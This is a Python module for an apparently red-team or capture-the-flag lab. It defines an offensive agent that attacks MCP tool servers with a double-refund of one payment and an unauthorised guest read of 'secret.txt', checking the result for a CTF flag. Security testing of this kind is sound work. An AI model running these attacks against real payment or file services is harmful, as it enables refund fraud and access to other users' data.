

from finbot.agents_mcp.base_mcp_agent import BaseMCPAgent


class MCPOffensiveAgent(BaseMCPAgent):
    def __init__(self, mcp_host, telemetry=None):
        super().__init__(mcp_host, "OffensiveAgent", telemetry)

    async def run(self, recon_results):
        results = {}

        for server, data in recon_results.items():
            results[server] = {"attacks": [], "exploits": []}

            # ---- PAYMENTS ----
            if "refund_payment" in data["high_risk_tools"]:
                attack = await self._attack_double_refund(server)
                results[server]["attacks"].append(attack)

                if self.telemetry:
                    self.telemetry.record_attack(
                        agent_name=self.name,
                        server=server,
                        attack_name="double_refund",
                        success=attack["success"],
                        evidence=attack["evidence"]
                    )

                if attack["success"]:
                    results[server]["exploits"].append("double_refund")

            # ---- DRIVE (BOLA) ----
            if "read_file" in data["high_risk_tools"]:
                attack = await self._attack_bola_read(server)
                results[server]["attacks"].append(attack)

                if self.telemetry:
                    self.telemetry.record_attack(
                        agent_name=self.name,
                        server=server,
                        attack_name="bola_read",
                        success=attack["success"],
                        evidence=attack["evidence"]
                    )

                if attack["success"]:
                    results[server]["exploits"].append("bola_read")

        return results

    async def _attack_double_refund(self, server):
        create = await self.call_tool(server, "create_payment", {"amount": 100})
        pid = self._extract_uuid(self._extract_text(create))

        r1 = await self.call_tool(server, "refund_payment", {"payment_id": pid})
        r2 = await self.call_tool(server, "refund_payment", {"payment_id": pid})

        t1 = self._extract_text(r1)
        t2 = self._extract_text(r2)

        return {
            "attack": "double_refund",
            "success": self._is_success(t1) and self._is_success(t2),
            "evidence": [t1, t2]
        }

    async def _attack_bola_read(self, server):
        res = await self.call_tool(
            server,
            "read_file",
            {"user_id": "guest", "filename": "secret.txt"}
        )

        text = self._extract_text(res)

        return {
            "attack": "bola_read",
            "success": self._is_success(text) and "CTF{" in text,
            "evidence": text
        }
